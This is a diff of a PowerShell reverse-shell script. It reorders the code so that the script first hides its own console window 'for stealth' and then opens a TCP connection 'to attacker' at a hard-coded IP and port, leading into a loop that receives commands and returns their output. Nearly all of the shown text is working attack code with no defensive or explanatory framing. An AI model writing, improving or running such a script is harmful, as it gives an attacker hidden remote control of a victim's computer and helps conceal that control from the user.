@@ -1,10 +1,3 @@
-# Setup TCP connection to attacker
-$client = New-Object System.Net.Sockets.TcpClient("192.168.1.184", 4444)
-$stream = $client.GetStream()
-$reader = New-Object System.IO.StreamReader($stream)
-$writer = New-Object System.IO.StreamWriter($stream)
-$writer.AutoFlush = $true
-
 # Hide the window if visible (stealth)
 $hwnd = (Get-Process -Id $PID).MainWindowHandle
 if ($hwnd -ne 0) {
@@ -19,6 +12,13 @@ public class WinAPI {
     Add-Type $signature
     [WinAPI]::ShowWindow($hwnd, 0)  # 0 = SW_HIDE
 }
+
+# Setup TCP connection to attacker
+$client = New-Object System.Net.Sockets.TcpClient("192.168.1.184", 4444)
+$stream = $client.GetStream()
+$reader = New-Object System.IO.StreamReader($stream)
+$writer = New-Object System.IO.StreamWriter($stream)
+$writer.AutoFlush = $true
 
 # Main loop to receive commands and send back output
 while ($true) {
